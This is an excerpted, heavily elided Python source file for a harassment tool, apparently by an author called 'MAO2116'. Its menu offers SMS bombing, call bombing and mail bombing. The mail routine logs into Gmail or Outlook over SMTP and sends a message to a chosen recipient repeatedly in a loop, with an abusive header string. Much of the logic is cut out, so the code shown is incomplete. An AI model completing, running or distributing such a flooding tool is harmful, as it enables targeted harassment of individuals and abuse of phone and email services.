...
try:
  from mao_protect_data import *
except:
  exit('[ ! ] REDOWNLOAD THIS TOOL FOR SOME TECHNICAL REASON [ ! ]')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
agents = ('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12',
...
def logomain():
  logomao=f"""
\033[1;33m {bcl}V.1.{gcl}2{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
...
\033[1;33m  |_| |_| |_|\033[1;36m|____/|____/\033[1;32m___|____/ \___/|_|  |_|____/ 
                  ...
                  \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mMAO2116
                  \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mMAO2116
                  {acl}[ {bcl}THANKS TO {acl}]{ccl} HRIDOY KHAN RASHID
\033[0;00m"""
  os.system("clear")
  print(logomao)
...
def usemail():
  maouser=input("YOUR EMAIL: ")
  maopass=MAOPASSWORDSET(prompt="EMAIL PASSWORD: ",mask="*")
  tomao=input("TO :")
  headers=(' MAO WANNA FUCK YOU ')
  subjectmao=input('SUBJECT :')
  body=input('MESSAGE :')
  ...
  try:
    ...
    for i in range(threat):
      ...
      print(f"[ {i2} ]MASSAGE SENT SUCCESSFULLY")
...
def usoutmail():
  ...
  try:
    ...
    exit('[ ! ] YOUR INTERNET CONNECTION IS TOO POOR [ ! ]')
  maoserver.ehlo()
  maoserver.starttls()
  try:
    maoserver.login(maouser, maopass)
...
def outlookmail():
  while True:
    logoemail="""
    [ 1. ] USE DEFULT OUTLOOKMAIL ()
    [ 2. ] USE YOUR OUTLOO KMAIL ()
    [ 99 ] BACK TO MAIN MANU ()
    [ 00 ] EXIT
...
def mainmanu():
  ...
  while True:
    ...
    logomain2()
    logomanu="""
    [ 1. ] SMS_BOMBING (ONLY SMS) :
    [ 2. ] SMS_BOMBING AND CALL BOMNBING :
    [ 3. ] MAIL_BOMBING(GMAIL,OUTLOOKMAIL)
    [ 4. ] VISIT AUTHER ( MAO )
    [ 5. ] VISIT GROUP ( THBD )
    [ 00. ] EXIT
    ...
    print(logomanu)
    mao=input("  ======>>")
    if mao == "1" or mao==" 1" or mao =="1 " or mao=="01":
      maobomb()
      break
    elif mao == "2" or mao==" 2" or mao =="2 " or mao=="02":
      maocallandbomb()
      break
    elif mao == "3" or mao==" 3" or mao =="3 " or mao=="03":
      logomail="""
      [ 1. ] EMAIL 
      [ 2. ] OUTLOOKMAIL
      [ 3. ] BACK TO MAIN_MANU
      ...
      if mao == "1" or mao==" 1" or mao =="1 " or mao=="01":
        ...
        mainmanu()
      elif mao == "4" or mao==" 4" or mao =="4 " or mao=="04":
        authermao()
      ...
      authermao()
      break
    elif mao == "5" or mao==" 5" or mao =="5 " or mao=="05":
      autherthbd()
      break
    elif mao == "00" or mao==" 00" or mao =="00 " or mao==" 00 ":
      ext()
      break
    else:
      print('[ ! ] WRONG INPUT [ ! ]')
